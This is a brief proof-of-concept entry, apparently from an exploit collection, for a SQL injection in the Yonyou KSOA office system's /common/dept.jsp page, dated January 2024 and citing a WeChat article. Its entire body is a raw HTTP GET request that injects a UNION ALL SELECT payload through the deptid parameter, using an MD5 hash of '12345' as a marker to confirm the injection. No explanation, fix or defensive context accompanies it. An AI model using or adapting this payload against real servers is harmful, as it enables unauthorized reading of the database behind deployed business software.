# yonyou_ksoa_dept.jsp_sqli

time: 2024/01/02
@1
from:https://mp.weixin.qq.com/s/I6aG2vFIi5nbVZfuVNpyDw

```
GET /common/dept.jsp?deptid=1' UNION ALL SELECT 60%2Csys.fn_sqlvarbasetostr(HASHBYTES('MD5'%2C'12345'))-- HTTP/1.1
Host: 127.0.0.1:898
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```
